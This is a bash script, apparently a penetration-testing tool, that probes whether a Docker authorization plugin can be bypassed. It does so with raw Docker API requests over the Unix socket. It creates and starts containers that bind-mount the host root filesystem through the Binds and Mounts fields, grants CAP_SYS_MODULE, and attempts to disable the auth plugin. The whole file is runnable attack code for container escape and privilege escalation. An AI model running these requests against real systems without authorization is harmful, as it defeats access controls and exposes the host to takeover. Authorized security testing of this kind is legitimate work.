#!/bin/bash
# Docker Auth Plugin Bypass Test Script
# For authorized security assessments only

set -e

API_VERSION=$(docker version --format '{{.Server.APIVersion}}')
SOCKET="/var/run/docker.sock"

echo "=== Docker Auth Plugin Bypass Tests ==="
echo "API Version: $API_VERSION"
echo ""

# Test 1: Binds in root JSON
echo "[Test 1] Binds in root JSON..."
CONTAINER_ID=$(curl --unix-socket $SOCKET \
    -H "Content-Type: application/json" \
    -d '{"Image": "ubuntu", "Binds":["/:/host"]}' \
    http://localhost/v${API_VERSION}/containers/create 2>/dev/null || echo "")
if [ -n "$CONTAINER_ID" ] && [ "$CONTAINER_ID" != "null" ]; then
    echo "  ✓ Container created: $CONTAINER_ID"
    docker start $CONTAINER_ID 2>/dev/null && echo "  ✓ Container started"
    docker rm -f $CONTAINER_ID 2>/dev/null || true
else
    echo "  ✗ Bypass failed or blocked"
fi
echo ""

# Test 2: Binds in HostConfig
echo "[Test 2] Binds in HostConfig..."
CONTAINER_ID=$(curl --unix-socket $SOCKET \
    -H "Content-Type: application/json" \
    -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' \
    http://localhost/v${API_VERSION}/containers/create 2>/dev/null || echo "")
if [ -n "$CONTAINER_ID" ] && [ "$CONTAINER_ID" != "null" ]; then
    echo "  ✓ Container created: $CONTAINER_ID"
    docker start $CONTAINER_ID 2>/dev/null && echo "  ✓ Container started"
    docker rm -f $CONTAINER_ID 2>/dev/null || true
else
    echo "  ✗ Bypass failed or blocked"
fi
echo ""

# Test 3: Mounts in root JSON
echo "[Test 3] Mounts in root JSON..."
CONTAINER_ID=$(curl --unix-socket $SOCKET \
    -H "Content-Type: application/json" \
    -d '{"Image": "ubuntu", "Mounts": [{"Name": "test", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw", "RW": true, "Type": "bind", "Target": "/host"}]}' \
    http://localhost/v${API_VERSION}/containers/create 2>/dev/null || echo "")
if [ -n "$CONTAINER_ID" ] && [ "$CONTAINER_ID" != "null" ]; then
    echo "  ✓ Container created: $CONTAINER_ID"
    docker start $CONTAINER_ID 2>/dev/null && echo "  ✓ Container started"
    docker rm -f $CONTAINER_ID 2>/dev/null || true
else
    echo "  ✗ Bypass failed or blocked"
fi
echo ""

# Test 4: Capabilities in HostConfig
echo "[Test 4] SYS_MODULE capability..."
CONTAINER_ID=$(curl --unix-socket $SOCKET \
    -H "Content-Type: application/json" \
    -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' \
    http://localhost/v${API_VERSION}/containers/create 2>/dev/null || echo "")
if [ -n "$CONTAINER_ID" ] && [ "$CONTAINER_ID" != "null" ]; then
    echo "  ✓ Container created: $CONTAINER_ID"
    docker start $CONTAINER_ID 2>/dev/null && echo "  ✓ Container started"
    docker rm -f $CONTAINER_ID 2>/dev/null || true
else
    echo "  ✗ Bypass failed or blocked"
fi
echo ""

# Test 5: Plugin disable
echo "[Test 5] Plugin disable capability..."
PLUGIN_NAME=$(docker plugin ls 2>/dev/null | grep -v "PLUGIN" | awk '{print $1}' | head -1)
if [ -n "$PLUGIN_NAME" ]; then
    echo "  Found plugin: $PLUGIN_NAME"
    docker plugin disable $PLUGIN_NAME 2>&1 | head -3 || echo "  ✗ Cannot disable plugin"
    # Re-enable immediately
    docker plugin enable $PLUGIN_NAME 2>/dev/null || true
else
    echo "  No plugins found to test"
fi
echo ""

echo "=== Bypass Tests Complete ==="
echo ""
echo "Review results above for potential bypass vectors."
echo "Remember to re-enable any disabled plugins!"
